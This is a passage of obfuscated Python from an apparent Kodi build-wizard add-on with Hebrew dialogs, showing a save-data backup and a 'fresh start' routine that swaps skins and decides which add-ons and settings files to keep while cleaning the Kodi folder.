				O00O00000OOO00OO0 =os .listdir (O0000O0OOOOOO0OOO )#line:4431
				for OO00O0O0O0O00O0OO in O00O00000OOO00OO0 :#line:4432
					O0O0O00OOO00O000O .write (os .path .join (O0000O0OOOOOO0OOO ,OO00O0O0O0O00O0OO ),os .path .join (O0000O0OOOOOO0OOO ,OO00O0O0O0O00O0OO ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4433
		O0O0O00OOO00O000O .close ()#line:4434
		if O0OO0OOOO0O0O00O0 ==OOO00OO000OOOO00O :#line:4435
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OO0OOOO0OOO00 ))#line:4436
		else :#line:4437
			try :#line:4438
				xbmcvfs .copy (OOO0OO0OOOO0OOO00 ,os .path .join (O0OO0OOOO0O0O00O0 ,'SaveData.zip'))#line:4439
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O0OO0OOOO0O0O00O0 ,'SaveData.zip')))#line:4440
			except :#line:4441
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OO0OOOO0OOO00 ))#line:4442
def freshStart (install =None ,over =False ):#line:4447
	if USERNAME =='':#line:4448
		ADDON .openSettings ()#line:4449
		sys .exit ()#line:4450
	OOO000000O0O000OO =u_list (SPEEDFILE )#line:4451
	(OOO000000O0O000OO )#line:4452
	O0OOO00OOOOO0OO0O =(wiz .workingURL (OOO000000O0O000OO ))#line:4453
	(O0OOO00OOOOO0OO0O )#line:4454
	if KEEPTRAKT =='true':#line:4455
		traktit .autoUpdate ('all')#line:4456
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4457
	if KEEPREAL =='true':#line:4458
		debridit .autoUpdate ('all')#line:4459
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4460
	if KEEPLOGIN =='true':#line:4461
		loginit .autoUpdate ('all')#line:4462
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4463
	if over ==True :O00000O0OOO0OOO0O =1 #line:4464
	elif install =='restore':O00000O0OOO0OOO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4465
	elif install :O00000O0OOO0OOO0O =1 #line:4466
	else :O00000O0OOO0OOO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4467
	if O00000O0OOO0OOO0O :#line:4468
		if not wiz .currSkin ()in ['skin.confluence','skin.myconfluence','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4469
			O0OOO00O0O00O0OO0 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.myconfluence'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4470
			skinSwitch .swapSkins (O0OOO00O0O00O0OO0 )#line:4473
			O00O0O0O0OOOO0OOO =0 #line:4474
			xbmc .sleep (1000 )#line:4475
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00O0O0O0OOOO0OOO <150 :#line:4476
				O00O0O0O0OOOO0OOO +=1 #line:4477
				xbmc .sleep (1000 )#line:4478
				wiz .ebi ('SendAction(Select)')#line:4479
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4480
				wiz .ebi ('SendClick(11)')#line:4481
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4482
			xbmc .sleep (1000 )#line:4483
		if not wiz .currSkin ()in ['skin.confluence','skin.myconfluence','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4484
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4485
			return #line:4486
		wiz .addonUpdates ('set')#line:4487
		OOO0O0OO00000OO00 =os .path .abspath (HOME )#line:4488
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4489
		OO0000OO0O00O0000 =sum ([len (O000OOOO00OO000OO )for OOOOOOO00O0000000 ,O0OO0OOOO0OOOOOO0 ,O000OOOO00OO000OO in os .walk (OOO0O0OO00000OO00 )]);OO00OO000000OOOOO =0 #line:4490
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4491
		EXCLUDES .append ('My_Builds')#line:4492
		EXCLUDES .append ('archive_cache')#line:4493
		EXCLUDES .append ('script.module.requests')#line:4494
		EXCLUDES .append ('myfav.anon')#line:4495
		if KEEPREPOS =='true':#line:4496
			OOO0O0O000O0OOOO0 =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4497
			for OOO0OOO00OOO0OO0O in OOO0O0O000O0OOOO0 :#line:4498
				O0000O0OO0O00O0O0 =os .path .split (OOO0OOO00OOO0OO0O [:-1 ])[1 ]#line:4499
				if not O0000O0OO0O00O0O0 ==EXCLUDES :#line:4500
					EXCLUDES .append (O0000O0OO0O00O0O0 )#line:4501
		if KEEPSUPER =='true':#line:4502
			EXCLUDES .append ('plugin.program.super.favourites')#line:4503
		if KEEPMOVIELIST =='true':#line:4504
			EXCLUDES .append ('plugin.video.metalliq')#line:4505
		if KEEPMOVIELIST =='true':#line:4506
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4507
		if KEEPADDONS =='true':#line:4508
			EXCLUDES .append ('addons')#line:4509
		if KEEPADDONS =='true':#line:4510
			EXCLUDES .append ('addon_data')#line:4511
		EXCLUDES .append ('plugin.video.elementum')#line:4514
		EXCLUDES .append ('script.elementum.burst')#line:4515
		EXCLUDES .append ('script.elementum.burst-master')#line:4516
		EXCLUDES .append ('plugin.video.quasar')#line:4517
		EXCLUDES .append ('script.quasar.burst')#line:4518
		EXCLUDES .append ('skin.estuary')#line:4519
		if KEEPWHITELIST =='true':#line:4522
			O00O0000OOO0O0000 =''#line:4523
			OO0O0O0O000OOOOOO =wiz .whiteList ('read')#line:4524
			if len (OO0O0O0O000OOOOOO )>0 :#line:4525
				for OOO0OOO00OOO0OO0O in OO0O0O0O000OOOOOO :#line:4526
					try :OOO0OO00OO0OOO0O0 ,O00OOOO000O0O0000 ,OO0OO000OOOOOOOO0 =OOO0OOO00OOO0OO0O #line:4527
					except :pass #line:4528
					if OO0OO000OOOOOOOO0 .startswith ('pvr'):O00O0000OOO0O0000 =O00OOOO000O0O0000 #line:4529
					OO000O0000O0O00OO =dependsList (OO0OO000OOOOOOOO0 )#line:4530
					for OOO0O0000O0OO0O0O in OO000O0000O0O00OO :#line:4531
						if not OOO0O0000O0OO0O0O in EXCLUDES :#line:4532
							EXCLUDES .append (OOO0O0000O0OO0O0O )#line:4533
						OOOOO00OOOO0O0OO0 =dependsList (OOO0O0000O0OO0O0O )#line:4534
						for OO0O000OOOO00OO0O in OOOOO00OOOO0O0OO0 :#line:4535
							if not OO0O000OOOO00OO0O in EXCLUDES :#line:4536
								EXCLUDES .append (OO0O000OOOO00OO0O )#line:4537
					if not OO0OO000OOOOOOOO0 in EXCLUDES :#line:4538
						EXCLUDES .append (OO0OO000OOOOOOOO0 )#line:4539
				if not O00O0000OOO0O0000 =='':wiz .setS ('pvrclient',OO0OO000OOOOOOOO0 )#line:4540
		if wiz .getS ('pvrclient')=='':#line:4541
			for OOO0OOO00OOO0OO0O in EXCLUDES :#line:4542
				if OOO0OOO00OOO0OO0O .startswith ('pvr'):#line:4543
					wiz .setS ('pvrclient',OOO0OOO00OOO0OO0O )#line:4544
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4545
		OO00OO0O000OOO00O =wiz .latestDB ('Addons')#line:4546
		for O0OOO000O0OOOO0OO ,O0000OOO0OO0OOO0O ,O0OOOOO00000OOOO0 in os .walk (OOO0O0OO00000OO00 ,topdown =True ):#line:4547
			O0000OOO0OO0OOO0O [:]=[OO0O0O0000OO0OO0O for OO0O0O0000OO0OO0O in O0000OOO0OO0OOO0O if OO0O0O0000OO0OO0O not in EXCLUDES ]#line:4548
			for OOO0OO00OO0OOO0O0 in O0OOOOO00000OOOO0 :#line:4549
				OO00OO000000OOOOO +=1 #line:4550
				OO0OO000OOOOOOOO0 =O0OOO000O0OOOO0OO .replace ('/','\\').split ('\\')#line:4551
				O00O0O0O0OOOO0OOO =len (OO0OO000OOOOOOOO0 )-1 #line:4553
				if OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4554
				elif OOO0OO00OO0OOO0O0 =='MyVideos99.db'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4555
				elif OOO0OO00OO0OOO0O0 =='MyVideos107.db'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4556
				elif OOO0OO00OO0OOO0O0 =='MyVideos116.db'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4557
				elif OOO0OO00OO0OOO0O0 =='MyVideos99.db'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4558
				elif OOO0OO00OO0OOO0O0 =='MyVideos107.db'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4559
				elif OOO0OO00OO0OOO0O0 =='MyVideos116.db'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4560
				elif OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4561
				elif OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'skin.anonymous.mod'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4562
				elif OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'skin.Premium.mod'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4563
				elif OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'skin.anonymous.nox'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4564
				elif OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'skin.phenomenal'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4565
				elif OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'plugin.video.metalliq'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4566
				elif OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'skin.titan'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4568
				elif OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'pvr.iptvsimple'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4569
				elif OOO0OO00OO0OOO0O0 =='sources.xml'and OO0OO000OOOOOOOO0 [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4571
				elif OOO0OO00OO0OOO0O0 =='quicknav.DATA.xml'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4574
				elif OOO0OO00OO0OOO0O0 =='x1101.DATA.xml'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4575
				elif OOO0OO00OO0OOO0O0 =='b-srtym-b.DATA.xml'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4576
				elif OOO0OO00OO0OOO0O0 =='x1102.DATA.xml'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4577
				elif OOO0OO00OO0OOO0O0 =='b-sdrvt-b.DATA.xml'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4578
				elif OOO0OO00OO0OOO0O0 =='x1112.DATA.xml'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4579
				elif OOO0OO00OO0OOO0O0 =='b-tlvvyzyh-b.DATA.xml'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4580
				elif OOO0OO00OO0OOO0O0 =='x1111.DATA.xml'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4581
				elif OOO0OO00OO0OOO0O0 =='b-tvknyshrly-b.DATA.xml'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4582
				elif OOO0OO00OO0OOO0O0 =='x1110.DATA.xml'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4583
				elif OOO0OO00OO0OOO0O0 =='b-yldym-b.DATA.xml'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4584
				elif OOO0OO00OO0OOO0O0 =='x1114.DATA.xml'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4585
				elif OOO0OO00OO0OOO0O0 =='b-mvzyqh-b.DATA.xml'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4586
				elif OOO0OO00OO0OOO0O0 =='mainmenu.DATA.xml'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4587
				elif OOO0OO00OO0OOO0O0 =='skin.Premium.mod.properties'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4588
				elif OOO0OO00OO0OOO0O0 =='favourites.xml'and OO0OO000OOOOOOOO0 [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4592
				elif OOO0OO00OO0OOO0O0 =='guisettings.xml'and OO0OO000OOOOOOOO0 [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4594
				elif OOO0OO00OO0OOO0O0 =='profiles.xml'and OO0OO000OOOOOOOO0 [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4595
				elif OOO0OO00OO0OOO0O0 =='advancedsettings.xml'and OO0OO000OOOOOOOO0 [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4596
				elif OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4597
				elif OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'program.apollo'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4598
				elif OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'plugin.video.allmoviesin'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4599
				elif OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'plugin.video.elementum'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4602
				elif OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'service.subtitles.All_Subs'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4603
				elif OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'plugin.audio.soundcloud'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4604
				elif OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'plugin.video.quasar'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4606
				elif OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'program.apollo'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4607
